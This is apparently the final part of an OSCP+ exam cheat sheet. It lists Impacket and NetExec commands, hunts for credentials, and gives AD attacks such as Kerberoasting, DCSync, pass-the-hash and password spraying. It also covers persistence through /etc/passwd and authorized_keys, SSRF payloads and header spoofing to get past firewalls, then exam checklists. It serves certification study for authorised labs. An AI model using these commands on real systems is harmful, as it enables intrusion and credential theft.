Docker API 88 Kerberos \| 3268 LDAP GC 110 POP3 \| 3306 MySQL 111
RPCbind \| 3389 RDP 119 NNTP \| 3690 SVN 135 MSRPC \| 4444 Metasploit
default 139 NetBIOS \| 5432 PostgreSQL 143 IMAP \| 5900 VNC 161 SNMP
(UDP) \| 5985 WinRM HTTP 389 LDAP \| 5986 WinRM HTTPS 443 HTTPS \| 6379
Redis 445 SMB \| 6667 IRC 465 SMTPS \| 8080 HTTP Alt 512 rexec \| 8443
HTTPS Alt 513 rlogin \| 8888 HTTP Alt 514 rsyslog \| 9200 Elasticsearch
515 LPD/LPR \| 27017 MongoDB 631 CUPS \| 11211 Memcached 636 LDAPS \|
873 rsync \|

    </details>

    <details>
    <summary>🛠️ 19.2 Impacket Complete Toolkit</summary>

    ```bash
    # ── EXECUTION ─────────────────────────────────────────────────
    impacket-psexec     DOMAIN/user:pass@IP          # SMB exec → SYSTEM
    impacket-smbexec    DOMAIN/user:pass@IP          # SMB exec → service shell
    impacket-wmiexec    DOMAIN/user:pass@IP          # WMI exec → no service
    impacket-atexec     DOMAIN/user:pass@IP 'whoami' # Task scheduler
    impacket-dcomexec   DOMAIN/user:pass@IP 'whoami' # DCOM exec

    # ── KERBEROS ──────────────────────────────────────────────────
    impacket-GetNPUsers    DOMAIN/ -dc-ip IP -request           # AS-REP roast
    impacket-GetUserSPNs   DOMAIN/user:pass -dc-ip IP -request  # Kerberoast
    impacket-ticketer      -nthash HASH -domain-sid SID -domain DOMAIN user  # Ticket forge
    impacket-getTGT        DOMAIN/user:pass                      # Get TGT
    impacket-getST         DOMAIN/user:pass -spn cifs/target     # Get service ticket

    # ── CREDENTIAL DUMPING ────────────────────────────────────────
    impacket-secretsdump   DOMAIN/user:pass@IP                   # Remote dump
    impacket-secretsdump   DOMAIN/user:pass@IP -just-dc-ntlm     # NTDS only
    impacket-secretsdump   -sam SAM -system SYSTEM LOCAL         # Local files
    impacket-secretsdump   -ntds ntds.dit -system SYSTEM LOCAL   # NTDS.dit

    # ── ENUMERATION ───────────────────────────────────────────────
    impacket-lookupsid     DOMAIN/user:pass@IP                   # SID enum
    impacket-samrdump      DOMAIN/user:pass@IP                   # SAR dump
    impacket-rpcdump       IP                                    # RPC endpoints
    impacket-reg           DOMAIN/user:pass@IP query -keyName HKU # Remote registry

    # ── FILE OPERATIONS ───────────────────────────────────────────
    impacket-smbclient     DOMAIN/user:pass@IP                   # SMB client
    impacket-smbserver     share /path/to/share -smb2support     # Host SMB share

    # ── DATABASE ──────────────────────────────────────────────────
    impacket-mssqlclient   DOMAIN/user:pass@IP                   # MSSQL client

    # ── NETWORK ───────────────────────────────────────────────────

    # ── WITH HASH (PtH) ───────────────────────────────────────────
    impacket-psexec    DOMAIN/user@IP -hashes :NTLMHASH
    impacket-wmiexec   DOMAIN/user@IP -hashes :NTLMHASH
    impacket-secretsdump DOMAIN/user@IP -hashes :NTLMHASH

    # ── WITH KERBEROS TICKET ──────────────────────────────────────
    export KRB5CCNAME=user.ccache
    impacket-psexec    DOMAIN/user@IP -no-pass -k


</details>


<details>


<summary>⚡ 19.3 nxc Full Reference</summary>






``` bash
# ── SMB ───────────────────────────────────────────────────────
nxc smb IP -u user -p pass
nxc smb IP -u user -H NTLMHASH          # PtH
nxc smb IP -u users.txt -p pass          # User spray
nxc smb IP -u user -p passwords.txt      # Pass spray
nxc smb IP -u user -p pass --shares      # List shares
nxc smb IP -u user -p pass --sessions    # Active sessions
nxc smb IP -u user -p pass --users       # Domain users
nxc smb IP -u user -p pass --groups      # Domain groups
nxc smb IP -u user -p pass --computers   # Domain computers
nxc smb IP -u user -p pass --loggedon-users
nxc smb IP -u user -p pass --sam         # Dump SAM
nxc smb IP -u user -p pass --lsa         # Dump LSA
nxc smb IP -u user -p pass --ntds        # Dump NTDS (DC only)
nxc smb IP -u user -p pass -x 'whoami'   # Run cmd command
nxc smb IP -u user -p pass -X 'Get-Process'  # Run PS command
nxc smb IP -u user -p pass --local-auth  # Local account auth
nxc smb IP/24 -u admin -H HASH --local-auth --continue-on-success

# ── WINRM ─────────────────────────────────────────────────────
nxc winrm IP -u user -p pass
nxc winrm IP -u user -p pass -x 'whoami'

# ── SSH ───────────────────────────────────────────────────────
nxc ssh IP -u user -p pass
nxc ssh IP/24 -u root -p passwords.txt

# ── MSSQL ─────────────────────────────────────────────────────
nxc mssql IP -u sa -p pass -q "SELECT @@version"
nxc mssql IP -u sa -p pass --local-auth
nxc mssql IP -u sa -p pass -x "whoami"  # xp_cmdshell

# ── RDP ───────────────────────────────────────────────────────
nxc rdp IP -u user -p pass
nxc rdp IP/24 -u Administrator -p 'Password123'

# ── OUTPUT INTERPRETATION ─────────────────────────────────────
# [+] GREEN  = Authentication success
# [-] RED    = Authentication failure
# [*] BLUE   = Information
# Pwn3d!    = Local admin / can execute commands
```


</details>


<details>


<summary>🔗 19.4 Essential Resources</summary>






    PRIVILEGE ESCALATION:
      GTFOBins (Linux):     https://gtfobins.github.io
      LOLBAS (Windows):     https://lolbas-project.github.io
      WADComs (AD):         https://wadcoms.github.io

    SHELLS & PAYLOADS:
      RevShells generator:  https://www.revshells.com
      PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

    EXPLOIT DATABASES:
      ExploitDB:            https://www.exploit-db.com
      Packetstorm:          https://packetstormsecurity.com
      NVD CVE:              https://nvd.nist.gov/vuln/search

    HASH CRACKING:
      Hashcat examples:     https://hashcat.net/wiki/doku.php?id=example_hashes
      CrackStation:         https://crackstation.net  (quick online check)
      Hashes.com:           https://hashes.com/en/decrypt/hash

    ENCODING/DECODING:
      CyberChef:            https://gchq.github.io/CyberChef
      JWT decoder:          https://jwt.io

    OSCP REFERENCE:
      HackTricks:           https://book.hacktricks.xyz
      IppSec YouTube:       https://www.youtube.com/@ippsec
      S1ren OSCP guide:     https://github.com/0xsyr0/OSCP
      TJ Null List:         https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8

    AD REFERENCE:
      AD Security:          https://adsecurity.org
      HackTricks AD:        https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
      BloodHound queries:   https://github.com/ly4k/BloodHound/

    WORDLISTS:
      SecLists:             https://github.com/danielmiessler/SecLists
      Assetnote:            https://wordlists.assetnote.io

    OSCP EXAM GUIDE:
      Official:             https://help.offsec.com/hc/en-us/articles/360040165632


</details>


<details>


<summary>⚡ 19.5 One-Liner Command Bank</summary>






``` bash
#Git clone and push using ssh : 
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.226.125:/git-server
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master

#Finding A file
find / -type f -name user.txt

# mtu packet set
sudo ifconfig tun0 mtu 1198

# ── QUICK WINS ────────────────────────────────────────────────
# Check sudo instantly:
sudo -l 2>/dev/null

# Find SUID instantly:
find / -perm -4000 -type f 2>/dev/null

# Find world-writable:
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Find passwords in files:
grep -r "password\|passwd\|secret\|credential" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null | grep -v "#" | grep -v "Binary"

# Check cron:
cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"

# Check capabilities:
getcap -r / 2>/dev/null

# Check listening services (internal):
ss -tulnp | grep "127.0.0.1"
netstat -antup | grep "127.0.0.1"

# Check for ssh keys:
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Unshadow for cracking:
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt

# ── PORT FORWARDING ONE-LINERS ────────────────────────────────
# SSH local forward:
ssh -L 8080:127.0.0.1:8080 -N user@PIVOT -i key

# Chisel forward:
./chisel client LHOST:8000 R:socks &

# Socat forward:
socat TCP-LISTEN:8080,fork TCP:INTERNAL_IP:80 &

# ── SHELL UPGRADE ONE-LINER ───────────────────────────────────
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg

# ── WINDOWS QUICK CHECKS ──────────────────────────────────────
# Check all privesc vectors in one shot:
whoami /all & net user & systeminfo & tasklist & schtasks /query /fo csv & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# Quick cred hunt:
findstr /si "password" *.txt *.xml *.ini *.config 2>nul
dir /s /b *pass* *cred* *vnc* 2>nul

# ── AD QUICK WINS ─────────────────────────────────────────────
# AS-REP request against saved, confirmed usernames:
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt

# Kerberoast with creds:
impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt

# Validate an evidence-derived credential against one justified host first:
nxc smb "$TARGET_HOST" -u "$CANDIDATE_USER" -p "$CANDIDATE_PASS" -d "$DOMAIN"

# If DCSync is proven, collect only the required account first:
impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER:$AUTH_PASS@$DC"
```


</details>


------------------------------------------------------------------------


<details>


<summary>🧠 19.x STUCK \> 20--30 MINUTES --- RESET PROCEDURE</summary>






``` text
STOP EXPLOITING
      ↓
FULL TCP PORTS?
      ↓
UDP?
      ↓
HOSTNAME / VHOST?
      ↓
MANUAL SERVICE ENUM?
      ↓
EXACT VERSION / BUILD?
      ↓
SOURCE / CONFIG / BACKUP?
      ↓
CREDENTIAL REUSE?
      ↓
INTERNAL-ONLY SERVICE?
      ↓
AUTOMATED PRIVESC?
      ↓
ACL / SUID / SERVICE / TASK?
      ↓
CVE PREREQUISITES?
      ↓
NEW HYPOTHESIS
```

If you have been repeating the same exploit path for 30 minutes, stop
and enumerate a different layer.


</details>

## 20. EXAM DAY CHECKLIST


<details>


<summary>🌅 20.1 Before the Exam Starts</summary>






    NIGHT BEFORE:
    [ ] Sleep 7-8 hours minimum — this is non-negotiable
    [ ] Prepare food and water
    [ ] Test VPN connection
    [ ] Verify Kali VM is running properly
    [ ] Check all tools are installed and updated
    [ ] Review your notes / cheatsheet one final time
    [ ] Set up tmux config
    [ ] Prepare note-taking template (copy for 6 machines: 3 AD + 3 standalone)
    [ ] Know exam end time and set alarms for breaks

    30 MINUTES BEFORE:
    [ ] Verify normal Internet + backup hotspot/power plan
    [ ] Do NOT expect the exam VPN pack yet — OffSec sends it at the exact exam start
    [ ] Open note-taking application
    [ ] Open Burp Suite
    [ ] Start tmux session
    [ ] Verify tun0 IP: ip a show tun0
    [ ] Check: export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [ ] Have proof.txt screenshot template ready
    [ ] Have report template open
    [ ] Close/disable AI chatbot workflows — AI/LLMs are prohibited during exam AND reporting
    [ ] Read the exam instructions ONE MORE TIME
    [ ] Keep the current OffSec Exam Guide/FAQ bookmarked


</details>


<details>


<summary>🚀 20.2 First 30 Minutes --- The Blitz</summary>






``` bash
# ── AT THE EXACT START ────────────────────────────────────────
# Download/extract the OffSec exam-connection pack and connect with the provided OpenVPN config.
# Read the control panel before touching a target.

# ── LAUNCH INITIAL ENUMERATION ────────────────────────────────
# Enumerate every control-panel target, but keep separate output per target and READ it.
# In one tmux pane per target:
export IP=TARGET_IP
mkdir -p ~/oscp/$IP/{scans,loot,exploits,evidence,notes}

# Quick focused visibility while the full scan runs:
sudo nmap -Pn -n --top-ports 1000 -sV -oA ~/oscp/$IP/scans/tcp-quick $IP

# Full TCP scan (use another pane/background job):
sudo nmap -Pn -n -p- --min-rate 1000 -oA ~/oscp/$IP/scans/tcp-all $IP
# If results look sparse or packets are dropped, lower/remove --min-rate and validate a small port set.

# Then run -sC/-sV only against the confirmed open ports and use native clients.
# AutoRecon is optional background coverage after manual high-signal work has started;
# inspect its configured scanners and read every result before launching more automation.

# ── WHILE SCANS RUN ───────────────────────────────────────────
# Read the exam control panel carefully:
# - Confirm the AD set username + password you've been issued
# - Note any special instructions
# - Note scoring breakdown
# - Screenshot the control panel

# ── FIRST ACTIONS BASED ON OPEN PORTS ────────────────────────
# AD creds already issued → start AD enum with them immediately
# SMB open everywhere → run nxc fingerprint
# Port 88 open → it's an AD machine → note DC IP
# Port 80 open → browse immediately, run gobuster
```


</details>


<details>


<summary>🎯 20.3 Machine Priority & Decision Tree</summary>






    STEP 1: IDENTIFY MACHINE TYPES
      Port 88 (Kerberos) + Port 389 (LDAP) = DOMAIN CONTROLLER
      Multiple Windows machines with 445, entered via issued creds = AD Set
      Everything else = Standalone (own foothold needed for each)
      A BOF may exist as ONE standalone's low-priv vector — it's no
      longer a guaranteed separate box (see Section 17 note)

    STEP 2: ATTACK ORDER — CHOOSE BY SIGNAL
      Run issued-credential AD enumeration immediately, but do not blindly spend hours there.
      Compare AD findings with standalone findings.

      Start with whichever gives the clearest evidence:
        • valid credential → remote access / interesting share / BloodHound edge
        • obvious vulnerable application/version with matching prerequisites
        • exposed secret / writable path / file-read / command primitive

      Work in 20–30 minute evidence blocks.
      No new evidence → rotate.
      New evidence → continue.

      Re-evaluate the official 70-point combinations after every flag.

    STEP 3: MINIMUM TO PASS (70 pts) — per OffSec, any ONE of:
      40 AD (all 3 AD machines) + 3× local.txt                    = 70
      40 AD + 2× local.txt + 1× proof.txt                          = 70
      20 AD (2 of 3 AD machines) + 3× local.txt + 2× proof.txt     = 70
      10 AD (1 of 3 AD machines) + all 3 standalones fully rooted  = 70
      (no bonus points exist anymore — these combos are the only ways in)

    STEP 4: IF YOU GET STUCK
      20–30 min or two failed tests with no new evidence = park/rotate
      Record facts, assumptions, the missing prerequisite and the exact return condition
      Re-read saved output, run one decisive check, then continue or rotate


</details>


<details>


<summary>🚨 20.4 Common Exam Mistakes --- Avoid All of These</summary>






    TECHNICAL MISTAKES:
      ✗ Forgetting to check UDP ports (161 SNMP especially)
      ✗ Not trying anonymous/null session on SMB and FTP
      ✗ Not checking for default credentials on every web login
      ✗ Running Metasploit Auxiliary/Exploit/Post or Meterpreter on more than 1 target
      ✗ Using a Metasploit module `check` on multiple targets
      ✗ Using Metasploit for pivoting
      ✗ Using SQLmap/SQLninja on the OSCP+ exam
      ✗ Using Responder LLMNR/NBT-NS poisoning/spoofing
      ✗ Using AI/LLM chatbots during the exam or report phase
      ✗ Not URL-encoding payloads when injecting via URL
      ✗ Forgetting EXITFUNC=thread in BOF shellcode
      ✗ Not setting binary mode in FTP before downloading
      ✗ Not testing found credentials on appropriate exposed services with scope/lockout awareness
      ✗ Stopping at user shell — always try for root
      ✗ Not reading /proc/self/fd/ when LFI is available
      ✗ Missing internal ports (127.0.0.1 only services)
      ✗ Not checking version numbers against searchsploit
      ✗ Using staged payloads when target can't reach back

    DOCUMENTATION MISTAKES:
      ✗ Not taking screenshot WITH IP visible
      ✗ Proof screenshot shows filename but not contents
      ✗ Forgetting to submit flags in control panel
      ✗ Not documenting the exact exploit used
      ✗ Missing screenshots of privilege escalation steps
      ✗ Not noting every command that led to compromise
      ✗ Forgetting local.txt (user flag) — it's 10 pts!

    MENTAL MISTAKES:
      ✗ Spending > 20–30 min on one attack path with no new evidence or precise cheap prerequisite
      ✗ Not taking breaks — brain fog is real after 4+ hours
      ✗ Tunnel vision — fixating on one service when others need attention
      ✗ Not re-reading nmap results when stuck
      ✗ Assuming a port is unimportant because it's non-standard
      ✗ Not sleeping the night before the exam
      ✗ Panicking — everything has a solution, breathe and enumerate

    SETUP MISTAKES:
      ✗ Not setting LHOST to tun0 IP (using eth0 instead)
      ✗ Forgetting to start a listener before sending exploit
      ✗ Shells timing out because listener wasn't ready
      ✗ File transfer failing because HTTP server not started
      ✗ Using wrong architecture payload (x86 vs x64)
      ✗ VPN disconnecting — check connectivity regularly


</details>


<details>


<summary>✅ 20.5 Pre-Submission Checklist</summary>






    BEFORE ENDING EXAM:
    [ ] All accessible flags captured (both local.txt and proof.txt)
    [ ] All flags submitted in control panel
    [ ] Official proof screenshot for EVERY earned flag:
          ✓ flag contents shown from ORIGINAL location using cat/type in an INTERACTIVE shell
          ✓ target IP visible in SAME screenshot using ip addr/ifconfig/ipconfig
          + hostname / whoami/id may be included as useful extra context
    [ ] Exact reproduction steps documented while every shell/path is fresh
    [ ] Exploit code saved (for report)
    [ ] All tool outputs saved (nmap, gobuster, etc.)
    [ ] Shell history saved:
          history > ~/oscp/TARGET_IP/shell_history.txt
    [ ] Note exact versions of vulnerable services
    [ ] Note exact CVEs / exploit names used
    [ ] Document ALL credentials found

    REPORT SUBMISSION:
    [ ] AI/LLM chatbots remain PROHIBITED during reporting
    [ ] Use official OSCP report template or an equally structured professional template
    [ ] Include all required proof screenshots
    [ ] Every compromise must be reproducible step-by-step
    [ ] Target sections, IPs and report order checked against the control panel
        (OffSec grades/values machines in the order documented)
    [ ] Unmodified public exploit: include its URL; do not dump pages of unchanged code
    [ ] Modified exploit: include modified code + original URL + highlighted changes/explanation
    [ ] PDF filename: OSCP-OS-XXXXX-Exam-Report.pdf
    [ ] Archive to: OSCP-OS-XXXXX-Exam-Report.7z (NO password)
    [ ] Create the .7z on Kali; archive contains only the final PDF; max upload size 200 MB
    [ ] Visually reopen/review the final exported PDF for formatting errors
    [ ] Upload within 24 hours at upload.offsec.com
    [ ] Compare the displayed upload MD5 with your local `md5sum`
    [ ] Click the final Submit File button
    [ ] Keep submission confirmation


</details>


------------------------------------------------------------------------


<details>


<summary>🔥 2026 ADDITIONS --- EASY-TO-MISS MODERN VECTORS</summary>






``` text
[ ] Exact distro package revision, not just upstream version
[ ] systemd timers, not only cron
[ ] D-Bus / Polkit / PackageKit
[ ] snapd / snap-confine
[ ] AppArmor / SELinux state
[ ] Docker socket
[ ] LXC/LXD group membership
[ ] UNIX sockets
[ ] Named pipes
[ ] DPAPI
[ ] Windows LAPS
[ ] gMSA
[ ] Shadow Credentials
[ ] AD CS ESC1–ESC17
[ ] RBCD / delegation attributes
[ ] GPO ACLs
[ ] Certificate mapping
[ ] Internal DNS after pivot
[ ] New routes after pivot
[ ] Exact Windows build + installed drivers
[ ] Exact kernel config + package backports
[ ] CVE prerequisites before PoC
```

### The "New Credential" Rule

Every time you find a credential:

``` text
IDENTIFY TYPE
   ↓
IDENTIFY OWNER
   ↓
TEST ALL RELEVANT SERVICES
   ↓
CHECK GROUPS / ACLs
   ↓
CHECK AD RELATIONSHIPS
   ↓
CHECK LAPS / gMSA / CERTIFICATE OPTIONS
```

### The "New Host" Rule

Every time a new hostname/IP appears:

``` text
ADD TO HOSTS/DNS NOTES
   ↓
PORT SCAN
   ↓
SERVICE ENUM
   ↓
COMPARE WITH EXISTING CREDENTIALS
   ↓
CHECK TRUST / AD RELATIONSHIPS
```


</details>

## 🔥 BONUS: MOST MISSED TRICKS


<details>


<summary>💎 Tricks Most People Forget</summary>






``` bash
# ── ALWAYS CHECK THESE (commonly missed) ─────────────────────

# 1. Credential fan-out across APPROPRIATE, EXPOSED, IN-SCOPE services
# Record provenance and check lockout policy first. Authentication != authorization.
nxc smb   $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
nxc winrm $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
# Add RDP/LDAP/MSSQL/SSH/web only where that service is actually exposed.

# 2. /etc/crontab AND /var/spool/cron/crontabs — different locations!
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"

# 3. Internal web apps (common in OSCP):
ss -tulnp | grep ":8"   # Any 8xxx port?
curl http://127.0.0.1:8080  # Try it directly
ssh -L 8080:127.0.0.1:8080 user@$IP  # Forward to see it from Kali

# 4. .bash_history is GOLD — always read it:
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null | sort -u

# 5. Check /var/backups/ and /opt/:
ls -laR /var/backups/ 2>/dev/null
ls -laR /opt/ 2>/dev/null

# 6. Config files usually have DB creds — check web root:
find /var/www -name "*.php" -exec grep -l "password\|DB_PASS\|db_pass" {} \;

# 7. SUID find exploit (super common, always missed):
find / -perm -4000 -type f 2>/dev/null | while read -r f; do
  echo "=== $f ===" && strings $f | grep -v "/" | head -5
done

# 8. NFS no_root_squash (check EVERY time NFS is open):
showmount -e $IP
cat /etc/exports 2>/dev/null | grep -i "no_root_squash"

# 9. Writable cron scripts (use pspy to watch, then check permissions):
./pspy64 -pf -i 1000 | tee /tmp/pspy.log &
sleep 60
grep -E 'root|UID=0' /tmp/pspy.log | grep -v pspy

# 10. MySQL file write requires:
# - FILE privilege (check: SHOW GRANTS)
# - secure_file_priv = '' (check: SHOW variables LIKE 'secure_file_priv')
# - Write access to target path
mysql -u root -p -e "SHOW variables LIKE 'secure_file_priv';"

# 11. GPP passwords in SYSVOL (if you have any domain user creds):
nxc smb $DC -u user -p pass -M gpp_password
nxc smb $DC -u user -p pass -M gpp_autologin
# Manual:
smbclient //DC/SYSVOL -U user%pass
# find Groups.xml and decrypt with: gpp-decrypt "HASH"

# 12. Unattended install files (Windows — forgotten by admins):
dir /s /b C:\Windows\Panther\Unattend*.xml 2>nul
dir /s /b C:\Windows\system32\sysprep\sysprep*.xml 2>nul

# 13. AutoLogon credentials in registry (jackpot when it exists):
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# 14. SSRF to read cloud metadata (check in web apps):
curl -s "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://TARGET/fetch?url=file:///etc/passwd"

# 15. /etc/passwd writable — snapshot and plan rollback before changing it:
ls -la /etc/passwd
stat /etc/passwd
# If world-writable and this is the selected proven path:
cp -- /etc/passwd /tmp/passwd.oscp.bak
stat -c 'owner=%u group=%g mode=%a' /etc/passwd | tee /tmp/passwd.oscp.meta
PASSWD_HASH=$(openssl passwd -6 'TEMP_STRONG_VALUE')
printf 'examops:%s:0:0:root:/root:/bin/bash\n' "$PASSWD_HASH" >> /etc/passwd
su examops
# Exact rollback from the root shell:
. /tmp/passwd.oscp.meta
cp -- /tmp/passwd.oscp.bak /etc/passwd
chown "$owner:$group" /etc/passwd
chmod "$mode" /etc/passwd

# 16. SSH authorized_keys — preserve the exact original first:
ssh-keygen -f /tmp/key -N ""
cp -a /home/user/.ssh/authorized_keys /tmp/authorized_keys.oscp.bak
cat /tmp/key.pub >> /home/user/.ssh/authorized_keys
ssh -i /tmp/key user@$IP
# Exact rollback from the privileged shell:
cp -a /tmp/authorized_keys.oscp.bak /home/user/.ssh/authorized_keys

# 17. LinPEAS colors prioritize review; they do not prove exploitability.
# Save the output, read the high-signal lines, then manually prove privilege,
# attacker control, configuration and trigger before changing anything.

# 18. MySQL UDF privesc (if MySQL running as root + have FILE priv):
searchsploit mysql udf
# Download raptor_udf2.c, compile, upload, create function → OS command exec

# 19. PHP disable_functions bypass (if you get a PHP shell but can't exec):
# Try: system, exec, passthru, shell_exec, popen, proc_open
# If all disabled → try: mail(), dl(), pcntl_exec()
# Or use Chankro bypass

# 20. If stuck on Windows privesc — check scheduled tasks binary paths:
schtasks /query /fo LIST /v | findstr /i "task to run\|run as"
# Then check if that binary is writable
icacls "C:\path\to\task_binary.exe"

# 21. Firewall bypass : 
X-Originating-IP: 127.0.0.1 or 127.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```


</details>


<details>


<summary>🎓 Final OSCP Wisdom</summary>






    MINDSET SHIFTS THAT MAKE PEOPLE PASS:

    1. ENUMERATION IS THE EXPLOIT
       "The finding is in the nmap output — I just haven't read it carefully enough"
       Go back to basics when stuck. Re-read everything.

    2. EVERY CREDENTIAL CHANGES THE ATTACK SURFACE
       Record provenance; test appropriate exposed in-scope services with lockout awareness.
       Separate authentication success from authorization and remote-admin access.

3. DEFAULT CREDS CAN BE A FAST, CONTROLLED CHECK
   Try a tiny application-appropriate set only where policy/scope permits.
   Stop before account lockout or blind spraying becomes the workflow.

4. THE RABBIT HOLE TEST
   If 20–30 minutes or two tests produce no new evidence and no precise cheap
   prerequisite remains: stop, record the return condition, and rotate.

5. THE OSCP REWARDS FUNDAMENTALS
   Prefer evidence-backed enumeration, misconfiguration and exact prerequisites
   over exotic assumptions. Simple does not mean automatic or guaranteed.

    6. DOCUMENTATION WINS OR LOSES POINTS
       A well-documented partial compromise can score points.
       An undocumented full compromise might not.
       Screenshot. Notes. Commands. Constantly.

7. STUCK DOES NOT MEAN RANDOM
   Re-read saved output, separate facts from assumptions, test one missing
   prerequisite, then rotate if confidence does not improve.

    8. PHYSICAL CONDITION MATTERS
       Sleep. Water. Movement. Breaks.
       Your brain on hour 16 is significantly worse than hour 4.
       Build breaks into your plan before you need them.

    GOOD LUCK. YOU'VE GOT THIS.


</details>


------------------------------------------------------------------------


## 📚 2026 MAINTENANCE & PRIMARY REFERENCES

### Current OSCP+ Exam Rules

- OSCP+ Exam Guide (updated 20 Apr 2026): https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- OSCP+ Exam FAQ (updated 31 Jul 2026): https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ
- AI Usage Policy (updated 01 Jul 2026): https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams
- OSCP Candidate Handbook (updated 31 Jul 2026): https://help.offsec.com/hc/en-us/articles/40393367449108-OSCP-Candidate-Handbook
- OSCP Reporting Requirements (updated 06 Aug 2026): https://help.offsec.com/hc/en-us/articles/360046787731-OSCP-Reporting-Requirements

**Snapshot checked 06 Sep 2026. Re-check these official pages immediately before your exam.** If these notes conflict with the current guide, policy, control-panel instructions or proctor direction, those current sources win.

### Vulnerability Intelligence

-   NVD: https://nvd.nist.gov/
-   Microsoft Security Response Center: https://msrc.microsoft.com/
-   Ubuntu Security Notices: https://ubuntu.com/security/notices
-   Debian Security Tracker: https://security-tracker.debian.org/
-   Exploit-DB: https://www.exploit-db.com/

### PrivEsc References

-   GTFOBins: https://gtfobins.github.io/
-   LOLBAS: https://lolbas-project.github.io/
-   HackTricks: https://book.hacktricks.wiki/

### AD / Modern Tooling

-   NetExec 1.5.1 release/security fix: https://github.com/Pennyw0rth/NetExec/releases/tag/v1.5.1
-   NetExec credential/result semantics (`[+]` and protocol-specific `Pwn3d!`): https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-credentials.md
-   NetExec local auth: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/authentication/checking-credentials-local.md
-   NetExec Kerberos cache: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-kerberos.md
-   NetExec certificate auth: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-certificates.md
-   Microsoft PowerShell remoting security (authentication and authorization context): https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security?view=powershell-7.6
-   Certipy releases (5.1.0 stable snapshot): https://github.com/ly4k/Certipy/releases
-   BloodHound releases (9.6.0 stable snapshot): https://github.com/SpecterOps/BloodHound/releases
-   Impacket 0.13.1 release/changelog: https://github.com/fortra/impacket/releases/tag/impacket_0_13_1
-   PayloadsAllTheThings:
    https://github.com/swisskyrepo/PayloadsAllTheThings

### CVE Entry Standard

When adding a future CVE, record:

``` text
CVE
Component
Affected versions/builds
Local/remote
Required privileges
Required configuration
Exploit prerequisites
Public PoC
Reliability
Detection method
Primary reference
```

> **Maintenance principle:** new does not automatically mean useful. Add
> CVEs that improve target identification, validation, or a realistic
> OSCP attack path.
